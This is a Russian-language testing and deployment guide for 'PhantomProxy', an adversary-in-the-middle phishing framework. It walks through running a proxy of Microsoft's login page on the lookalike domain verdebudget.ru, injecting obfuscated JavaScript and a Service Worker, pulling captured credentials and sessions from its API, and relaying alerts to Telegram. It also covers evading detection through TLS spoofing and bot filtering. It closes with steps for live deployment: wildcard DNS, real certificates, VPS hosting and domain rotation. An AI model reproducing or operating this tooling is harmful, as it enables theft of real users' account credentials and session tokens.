# 🧪 Тестирование PhantomProxy для verdebudget.ru

## 📋 Быстрый Старт

### 1. Запуск Сервера

```powershell
# Запуск в режиме отладки на порту 8443
cd "C:\Users\Administrator\IdeaProjects\Evingix TOP PROdachen"
.\phantom-proxy.exe -config config_verdebudget.yaml -debug
```

**Ожидаемый вывод:**
```
██████╗  ██████╗ ██╗     ██╗     ██╗███╗   ██╗ ██████╗ 
...
PhantomProxy v1.0.0-dev - AitM Framework Next Generation

[*] Starting PhantomProxy...
[✓] Config loaded: verdebudget.ru
[✓] Database initialized: ./phantom.db
[✓] TLS Spoof Manager initialized
[✓] Phishlets loaded: 1
[✓] HTTP Proxy starting: 0.0.0.0:8443
[✓] API server starting: 8080
[✓] ML Bot Detector initialized (rule-based)
```

---

### 2. Проверка Работы API

```powershell
# Health check
curl http://localhost:8080/health

# Статистика
curl http://localhost:8080/api/v1/stats `
  -H "Authorization: Bearer verdebudget-secret-key-change-me"

# Список phishlets
curl http://localhost:8080/api/v1/phishlets `
  -H "Authorization: Bearer verdebudget-secret-key-change-me"
```

**Ожидаемый ответ:**
```json
{
  "status": "ok",
  "timestamp": "2026-02-18T..."
}
```

---

### 3. Добавление Записи в Hosts

Для тестирования добавьте запись в файл hosts:

**Windows:** `C:\Windows\System32\drivers\etc\hosts`
**Linux/Mac:** `/etc/hosts`

```
127.0.0.1 login.verdebudget.ru
127.0.0.1 api.verdebudget.ru
127.0.0.1 www.verdebudget.ru
```

---

### 4. Тестирование Фишлета

#### Шаг 1: Откройте браузер

```
https://login.verdebudget.ru:8443
```

#### Шаг 2: Проверьте Service Worker

Откройте консоль разработчика (F12) → Console

**Ожидаемые сообщения:**
```
[PhantomSW] Service Worker supported
[PhantomSW] Registered: https://login.verdebudget.ru:8443/
[PhantomJS] Loaded
```

#### Шаг 3: Проверьте Проксирование

Перейдите на:
```
https://login.verdebudget.ru:8443/common/oauth2/v2.0/authorize?client_id=...
```

**Должно произойти:**
- ✅ Запрос проксирован на login.microsoftonline.com
- ✅ Контент модифицирован (замена доменов)
- ✅ JavaScript внедрён
- ✅ Service Worker зарегистрирован

---

### 5. Тест Перехвата Креденшалов

#### Создайте тестовую сессию:

```powershell
# Через API
curl -X POST http://localhost:8080/api/v1/sessions `
  -H "Authorization: Bearer verdebudget-secret-key-change-me" `
  -H "Content-Type: application/json" `
  -d '{"target_url": "https://login.microsoftonline.com"}'
```

#### Проверьте сессии:

```powershell
curl http://localhost:8080/api/v1/sessions `
  -H "Authorization: Bearer verdebudget-secret-key-change-me"
```

---

### 6. Тест WebSocket

```powershell
# Установите wscat
npm install -g wscat

# Подключение
wscat -c wss://login.verdebudget.ru:8443/ws
```

**Ожидаемый результат:**
```
Connected to wss://login.verdebudget.ru:8443/ws
```

---

### 7. Тест Telegram Бота (опционально)

#### Настройте бота:

1. Создайте бота в @BotFather
2. Получите токен
3. Узнайте ChatID через @userinfobot

#### Обновите config_verdebudget.yaml:

```yaml
telegram_enabled: true
telegram_token: "YOUR_BOT_TOKEN_FROM_BOTFATHER"
telegram_chat_id: 123456789
```

#### Перезапустите сервер и проверьте:

В Telegram: `/start`

**Ответ:**
```
👋 PhantomProxy Bot

Доступные команды:
/stats - Статистика
/sessions - Последние сессии
/help - Помощь
```

---

## 🔍 Проверка Работы Компонентов

### ✅ TLS Spoofing

```powershell
# Проверка JA3 fingerprint
curl -v https://login.verdebudget.ru:8443 2>&1 | grep -i "TLS"
```

### ✅ Service Worker

Откройте в браузере:
```
https://login.verdebudget.ru:8443/sw.js
```

**Должен вернуться JavaScript код Service Worker**

### ✅ Polymorphic JS

Проверьте исходный код страницы (Ctrl+U):

**Ищите:**
```html
<script id="phantom-inject">
...
String.fromCharCode(86, 101, 114, 100, 101, 66, 117, 100, 103, 101, 116)
...
</script>
```

### ✅ ML Bot Detector

Проверьте логи:

```powershell
Get-Content ./logs/phantom.log -Tail 50
```

**Ищите сообщения:**
```
Bot detection completed: is_bot=false, confidence=0.75
```

---

## 📊 Мониторинг в Реальном Времени

### Логи сервера:

```powershell
# PowerShell
Get-Content ./logs/phantom.log -Wait -Tail 100

# CMD
type .\logs\phantom.log
```

### Статистика через API:

```powershell
while ($true) {
    Clear-Host
    curl http://localhost:8080/api/v1/stats `
      -H "Authorization: Bearer verdebudget-secret-key-change-me" | ConvertFrom-Json
    Start-Sleep -Seconds 5
}
```

---

## 🐛 Решение Проблем

### Ошибка: "Failed to load phishlets"

**Решение:**
```powershell
# Проверьте наличие файла
Test-Path ./configs/phishlets/verdebudget_microsoft.yaml

# Если нет - создайте (см. выше)
```

### Ошибка: "Address already in use"

**Решение:**
```powershell
# Найдите процесс на порту 8443
netstat -ano | findstr :8443

# Убейте процесс
taskkill /PID <PID> /F
```

### Ошибка: "Certificate not found"

**Решение:**
```powershell
# Проверьте сертификаты
Test-Path ./certs/cert.pem
Test-Path ./certs/key.pem

# Если нет - перегенерируйте
.\phantom-proxy.exe run gencert
```

### Ошибка: "Telegram bot failed"

**Решение:**
1. Проверьте токен бота
2. Убедитесь, что бот добавлен в чат
3. Проверьте ChatID

---

## ✅ Чеклист Тестирования

- [ ] Сервер запускается без ошибок
- [ ] API отвечает на /health
- [ ] Phishlet загружен (1 шт)
- [ ] Service Worker регистрируется в браузере
- [ ] Проксирование на Microsoft работает
- [ ] Контент модифицируется (замена доменов)
- [ ] JavaScript внедряется в HTML
- [ ] WebSocket подключение работает
- [ ] Сессии создаются в БД
- [ ] Telegram бот отвечает (если включён)
- [ ] ML детект логирует запросы
- [ ] Логи записываются в файл

---

## 📝 Примеры Запросов API

### Получить все сессии:

```powershell
curl http://localhost:8080/api/v1/sessions `
  -H "Authorization: Bearer verdebudget-secret-key-change-me" | ConvertFrom-Json
```

### Получить сессию по ID:

```powershell
curl http://localhost:8080/api/v1/sessions/<SESSION_ID> `
  -H "Authorization: Bearer verdebudget-secret-key-change-me"
```

### Получить креденшалы:

```powershell
curl http://localhost:8080/api/v1/credentials `
  -H "Authorization: Bearer verdebudget-secret-key-change-me"
```

### Удалить сессию:

```powershell
curl -X DELETE http://localhost:8080/api/v1/sessions/<SESSION_ID> `
  -H "Authorization: Bearer verdebudget-secret-key-change-me"
```

---

## 🎯 Следующие Шаги

После успешного тестирования:

1. **Настройте реальный домен:**
   - Купите домен verdebudget.ru (если ещё не куплен)
   - Настройте DNS (*.verdebudget.ru → ваш IP)
   - Получите Let's Encrypt сертификаты

2. **Включите Telegram уведомления:**
   - Создайте бота в @BotFather
   - Добавьте токен в config

3. **Разверните на сервере:**
   - Linux VPS (Ubuntu 22.04)
   - Docker (опционально)
   - Systemd сервис

4. **Настройте ротацию доменов:**
   - Domain rotation в config
   - Несколько доменов для резерва

---

**📞 Поддержка:** См. README.md и FINAL_REPORT_v1.0.md
